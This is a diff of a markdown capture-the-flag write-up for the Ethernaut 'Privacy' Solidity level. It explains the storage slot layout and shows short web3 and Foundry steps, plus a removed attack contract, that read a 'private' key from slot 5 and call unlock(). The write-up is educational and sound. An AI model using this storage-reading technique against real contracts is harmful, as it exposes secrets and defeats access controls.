@@ -10,7 +10,10 @@
 
 - [Table of Contents](#table-of-contents)
 - [Objectif](#objectif)
+- [The hack](#the-hack)
 - [Solution](#solution)
+  - [In the browser console:](#in-the-browser-console)
+  - [With Foundry using `forge`:](#with-foundry-using-forge)
 - [Takeaway](#takeaway)
 - [References](#references)
 
@@ -18,86 +21,86 @@
 
 <img src="../assets/requirements/12-privacy-requirements.webp" width="800px"/>
 
-Requires a good understanding of how storage works in solidity, and how to access it.
+## The hack
 
-## Solution
+Nothing complex in how to solve the challenge, we must retrieve the key and call the `unlock()` function to beat it.
 
-Below is the break up of how the state variables fit into different slots.
+Like in the previous Vault level, we need a good understanding of how storage works in solidity, and how to access it. Only this time, we go a little further as this level introduces static-sized array type.
 
+```javascript
+function unlock(bytes16 _key) public {
+    require(_key == bytes16(data[2]));
+    locked = false;
+  }
 ```
-// Slot 0
+
+We can see that the `_key` we are looking for must be equal to `bytes16(data[2])`. So how can we access `data[2]`?
+
+Here is the storage:
+
+```javascript
 bool public locked = true;
-
-// Slot 1
 uint256 public ID = block.timestamp;
-
-// Slot 2
 uint8 private flattening = 10;
-
-// Slot 2
 uint8 private denomination = 255;
-
-// Slot 2
 uint16 private awkwardness = uint16(block.timestamp);
-
-// Slot 3, 4, 5
 bytes32[3] private data;
 ```
 
-Basically, the info stored at slot 5 is to be passed to the unlock function to clear the level.
-Note the usage of `call` with `abi.encodeWithSignature`
+Since there is no inheritance, the storage starts at slot 0 with the `locked` variable and goes as follows:
 
-```java
-contract PrivacyAttack {
+| Slot | Variable                                    | Type                       | Notes                                                                                                                                |
+| ---- | ------------------------------------------- | -------------------------- | ------------------------------------------------------------------------------------------------------------------------------------ |
+| 0    | `locked`                                    | `bool`                     | `locked` takes 1 byte, but since the next value doesn't fit in the 31 bytes left, `locked` takes the whole slot (Not best practice!) |
+| 1    | `ID`                                        | `uint256`                  | `uint256` takes 32 bytes, so 1 full slot                                                                                             |
+| 2    | `flattening`, `denomination`, `awkwardness` | `uint8`, `uint8`, `uint16` | Respectively 1 byte + 1 byte + 2 bytes, so solidity packs these together into a single slot.                                         |
+| 3    | `data[0]`                                   | `bytes32`                  | Static arrays start a new storage slot, each `bytes32` element taking one full slot.                                                 |
+| 4    | `data[1]`                                   | `bytes32`                  |                                                                                                                                      |
+| 5    | `data[2]`                                   | `bytes32`                  | This is the slot containing `data[2]`.                                                                                               |
 
-	event Response(bool success, bytes data);
+With this detailed storage layout, we can see that `data[2]` is stored in slot 5. We can now move to the solution.
 
+## Solution
 
-	function bytes32ToBytes16(bytes32 data, address privacyContract) public {
+We have to read the storage at slot 5 to get the value of `data[2]`.
 
-		bytes16 convertedBytes = bytes16(data);
+### In the browser console:
 
+We can do this by calling the `web3.eth.getStorageAt` function.
 
-
-	// one way would be to import the abi (which on remix can be done by pasting the code into a file and compiling it)
-
-	// then import it into this contract, create an object and then call
-
-	// method2 would be use call on its address (since we know the function already)
-
-		(bool success, bytes memory data) = privacyContract.call(
-
-			abi.encodeWithSignature("unlock(bytes16)", convertedBytes)
-
-		);
-
-
-
-		emit Response(success, data);
-
-
-
-		}
-
-}
+```javascript
+// Read the storage at slot 5
+const contents1 = await web3.eth.getStorageAt(instance, 5);
+// Format the key to bytes16
+const key = contents1.substring(0, 34);
 ```
+
+Then we can call the `unlock` function with the value we got from the storage.
+
+```javascript
+await contract.unlock(key);
+```
+
+### With Foundry using `forge`:
+
+You can also achieve the same with Foundry by using the `vm.load` function. To run the script:
+
+```bash
+forge script script/12_Privacy.s.sol:PoC --rpc-url sepolia --broadcast --verify --etherscan-api-key $ETHERSCAN_API_KEY --watch
+```
+
+Done.
 
 ## Takeaway
 
-```
-# Storage
-- 2 ** 256 slots
-- 32 bytes for each slot
-- data is stored sequentially in the order of declaration
-- storage is optimized to save space. If neighboring variables fit in a single 32 bytes, then they are packed into the same slot, starting from the right
-
-# Format of encodeWithSignature: endocdeWithSignature(functionName("function param type)", param)
-```
+- Again, nothing is private on-chain. Everything is public and can be read by anyone.
+- Organize your storage to save space and gas.
 
 ## References
 
-- https://solidity-by-example.org/hacks/accessing-private-data/
-- https://programtheblockchain.com/posts/2018/03/09/understanding-ethereum-smart-contract-storage/
+- Private data: https://solidity-by-example.org/hacks/accessing-private-data/
+- EVM storage: https://programtheblockchain.com/posts/2018/03/09/understanding-ethereum-smart-contract-storage/
+- Storage layout: https://docs.soliditylang.org/en/latest/internals/layout_in_storage.html
 
 <div align="center">
 <br>
